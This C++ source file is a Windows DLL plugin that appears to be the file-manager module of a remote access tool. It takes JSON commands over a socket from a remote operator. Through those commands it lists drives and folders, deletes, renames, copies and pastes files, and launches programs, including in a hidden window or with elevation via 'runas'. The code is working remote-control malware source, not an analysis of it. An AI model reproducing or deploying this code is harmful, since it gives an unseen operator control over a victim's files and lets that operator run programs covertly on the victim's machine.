#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <shlobj.h>
#include <shellapi.h>
#include <string>
#include <vector>
#include <cstdint>
#include <algorithm>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace std;

static string clipboard_path = "";

static void send_json(SOCKET sock, const json& data) {
    string msg = data.dump() + "\r\n";
    send(sock, msg.c_str(), (int)msg.length(), 0);
}

static string get_last_error_message(DWORD errorCode) {
    if (errorCode == ERROR_SUCCESS) return "Success";
    char* buffer = nullptr;
    DWORD size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&buffer, 0, NULL
    );
    string message = (size && buffer) ? string(buffer, size) : ("Error code: " + to_string(errorCode));
    if (buffer) LocalFree(buffer);
    while (!message.empty() && (message.back() == '\r' || message.back() == '\n' || message.back() == ' '))
        message.pop_back();
    return message;
}

static string format_size(uint64_t size) {
    const char* units[] = {"B", "KB", "MB", "GB", "TB"};
    int unit = 0;
    double dSize = (double)size;
    while (dSize >= 1024 && unit < 4) {
        dSize /= 1024;
        unit++;
    }
    char buf[32];
    sprintf(buf, "%.2f %s", dSize, units[unit]);
    return string(buf);
}

static string filetime_to_string(FILETIME ft) {
    SYSTEMTIME st;
    FileTimeToSystemTime(&ft, &st);
    char buf[64];
    sprintf(buf, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return string(buf);
}

static void send_drives(SOCKET sock) {
    json response;
    response["action"] = "filemanager_response";
    response["type"] = "drives";
    json drives = json::array();

    char driveStrings[256];
    DWORD length = GetLogicalDriveStringsA(sizeof(driveStrings), driveStrings);
    if (length > 0) {
        char* drive = driveStrings;
        while (*drive) {
            drives.push_back(string(drive));
            drive += strlen(drive) + 1;
        }
    }
    response["drives"] = drives;
    send_json(sock, response);
}

static void send_files(SOCKET sock, string path) {
    if (path.empty()) {
        send_drives(sock);
        return;
    }

    if (path.back() != '\\') path += "\\";

    json response;
    response["action"] = "filemanager_response";
    response["type"] = "files";
    response["path"] = path;
    json files = json::array();

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((path + "*").c_str(), &findData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
                continue;

            json item;
            item["name"] = string(findData.cFileName);
            item["date"] = filetime_to_string(findData.ftLastWriteTime);

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                item["type"] = "Folder";
                item["size"] = "";
            } else {
                item["type"] = "File";
                uint64_t size = ((uint64_t)findData.nFileSizeHigh << 32) | findData.nFileSizeLow;
                item["size"] = format_size(size);
            }
            files.push_back(item);
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }

    response["files"] = files;
    send_json(sock, response);
}

static void send_log(SOCKET sock, const string& message) {
    json log;
    log["action"] = "filemanager_response";
    log["type"] = "log";
    log["message"] = message;
    send_json(sock, log);
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_drives(sock);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "getdrives") {
            send_drives(sock);
        }
        else if (action == "getfiles") {
            send_files(sock, command.value("path", ""));
        }
        else if (action == "deletefile") {
            string path = command.value("path", "");
            DWORD attr = GetFileAttributesA(path.c_str());
            BOOL success = FALSE;
            if (attr != INVALID_FILE_ATTRIBUTES) {
                if (attr & FILE_ATTRIBUTE_DIRECTORY) success = RemoveDirectoryA(path.c_str());
                else success = DeleteFileA(path.c_str());
            }
            if (success) {
                send_log(sock, "Deleted: " + path);
                string parent = path.substr(0, path.find_last_of("\\"));
                send_files(sock, parent);
            } else {
                send_log(sock, "Delete failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "rename") {
            string oldpath = command.value("oldpath", "");
            string newpath = command.value("newpath", "");
            if (MoveFileA(oldpath.c_str(), newpath.c_str())) {
                send_log(sock, "Renamed to: " + newpath);
                string parent = oldpath.substr(0, oldpath.find_last_of("\\"));
                send_files(sock, parent);
            } else {
                send_log(sock, "Rename failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "execute") {
            string path = command.value("path", "");
            string mode = command.value("mode", "normal");
            INT show = SW_SHOWNORMAL;
            if (mode == "hidden") show = SW_HIDE;

            HINSTANCE res;
            if (mode == "runas") {
                res = ShellExecuteA(NULL, "runas", path.c_str(), NULL, NULL, show);
            } else {
                res = ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, show);
            }

            if ((uintptr_t)res > 32) send_log(sock, "Executed (" + mode + "): " + path);
            else send_log(sock, "Execute failed: " + get_last_error_message(GetLastError()));
        }
        else if (action == "createfolder") {
            string path = command.value("path", "");
            if (CreateDirectoryA(path.c_str(), NULL)) {
                send_log(sock, "Folder created: " + path);
                string parent = path.substr(0, path.find_last_of("\\"));
                send_files(sock, parent);
            } else {
                send_log(sock, "Create folder failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "copyfile") {
            clipboard_path = command.value("path", "");
            send_log(sock, "Copied to clipboard: " + clipboard_path);
        }
        else if (action == "pastefile") {
            if (clipboard_path.empty()) {
                send_log(sock, "Clipboard is empty");
                return;
            }
            string dest_dir = command.value("path", "");
            if (dest_dir.back() != '\\') dest_dir += "\\";
            string filename = clipboard_path.substr(clipboard_path.find_last_of("\\") + 1);
            string dest_path = dest_dir + filename;

            if (CopyFileA(clipboard_path.c_str(), dest_path.c_str(), FALSE)) {
                send_log(sock, "Pasted: " + dest_path);
                send_files(sock, dest_dir);
            } else {
                send_log(sock, "Paste failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "downloadfile") {
            send_log(sock, "Download initiated (Feature to be implemented in next phase)");
        }
    } catch (...) {
        send_log(sock, "Client-side plugin error processing command");
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
